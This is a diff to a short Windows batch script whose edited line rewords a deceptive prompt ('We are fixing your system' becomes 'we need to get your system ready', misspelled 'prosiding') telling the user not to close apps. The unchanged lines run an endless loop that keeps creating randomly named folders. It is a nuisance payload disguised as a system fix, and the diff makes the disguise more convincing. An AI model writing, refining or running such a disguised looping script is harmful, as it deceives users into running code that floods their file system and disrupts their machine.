@@ -1,5 +1,5 @@
 @echo off
-start "" /wait cmd /c "echo We are fixing your system. We may need to open some apps and run some codes so don't close those apps!&echo(&pause"
+start "" /wait cmd /c "echo Before prosiding, we need to get your system ready. We may need to open some apps and run some codes so don't close those apps!&echo(&pause"
 :A
 mkdir %random%
 goto A
